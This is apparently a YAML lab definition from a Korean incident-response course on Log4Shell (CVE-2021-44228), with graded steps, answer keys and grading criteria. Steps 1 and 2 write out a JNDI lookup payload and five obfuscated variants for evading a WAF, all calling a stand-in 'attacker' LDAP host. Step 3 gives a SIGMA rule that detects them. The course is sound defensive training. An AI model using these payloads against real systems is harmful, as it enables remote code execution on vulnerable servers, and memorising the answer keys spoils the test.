lab_id: agent-ir-adv-nonai-week06
title: N-day 대규모 악용 (Log4Shell 계열) IR (Non-AI)
version: nonai
course: agent-ir-adv-nonai
week: 6
description: 공개 후 4시간 내 대응. Virtual Patch 2h / Emergency Patch 48h SLA. 학생이 수동 수행·기록.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Log4Shell 페이로드 예시
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
  answer_detail: '[공격] 기본 페이로드.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: '[공격] Log4Shell 기본 페이로드 — echo ''${jndi:ldap://attacker/a}'' > w06-log4shell.txt. CVE-2021-44228.
        MITRE T1190. JNDI injection.'
      success_criteria:
      - jndi 키워드
      - ${jndi:ldap:// 구문
      - 기본 payload
      acceptable_methods:
      - ${jndi:ldap://}
      - rmi 대체
      - dns 대체
      negative_signs:
      - jndi 없음
      - URL 없음
      - 구문 오류
  target_vm: web
  script: echo '${jndi:ldap://attacker/a}' > /tmp/w06-log4shell.txt && cat /tmp/w06-log4shell.txt
  risk_level: low
  bastion_prompt: ''
- order: 2
  instruction: 변형 페이로드 5종
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 10
  answer: 'cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  answer_detail: '[공격] 변형으로 WAF 우회.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: '[공격] 변형 페이로드 5종 — cat > w06-variants.txt: ${::-j} 분할 / ${lower:j} / ${env:BARFOO:-j} /
        ${lower:ldap} / ${::-attacker}. WAF 우회 변형. Log4j 룩업 중첩.'
      success_criteria:
      - jndi 키워드
      - 5 변형
      - 문법 우회
      acceptable_methods:
      - 5 변형 기법
      - Log4j lookup
      - polymorphic payload
      negative_signs:
      - 변형 2개 이하
      - 문법 단순
      - 우회 맥락 없음
  target_vm: web
  script: 'cat > /tmp/w06-variants.txt <<''T''

    ${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}

    ${${lower:j}ndi:ldap://attacker/a}

    ${${env:BARFOO:-j}ndi:ldap://attacker/a}

    ${jndi:${lower:l}${lower:d}${lower:a}p://attacker/a}

    ${jndi:ldap://${::-attacker}/a}

    T

    cat /tmp/w06-variants.txt'
  risk_level: low
  bastion_prompt: ''
- order: 3
  instruction: Suricata/SIGMA 룰
  hint: 6단계 IR 중 탐지 단계. target_vm=siem.
  category: analysis
  points: 11
  answer: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\n\
    Y\ncat ~/w06/rule.yml"
  answer_detail: '[탐지] JNDI 패턴 탐지.'
  verify:
    type: output_contains
    expect: jndi
    field: stdout
    semantic:
      intent: '[탐지] SIGMA Log4Shell — cat > rule.yml: payload contains [''${jndi:'', ''${${::-j}${::-n}'']
        + level critical. JNDI 패턴 + 변형 탐지.'
      success_criteria:
      - jndi 키워드
      - contains 배열
      - critical
      acceptable_methods:
      - SIGMA contains
      - Suricata content
      - YARA
      negative_signs:
      - 패턴 1개
      - critical 아님
      - 변형 누락
  target_vm: siem
  script: "mkdir -p ~/w06 && cat > ~/w06/rule.yml <<'Y'\ntitle: Log4Shell JNDI burst\ndetection:\n  selection:\n\
    \    payload|contains: ['${jndi:', '${${::-j}${::-n}']\n  condition: selection\nlevel: critical\n\
    Y\ncat ~/w06/rule.yml"
  risk_level: low
  bastion_prompt: ''
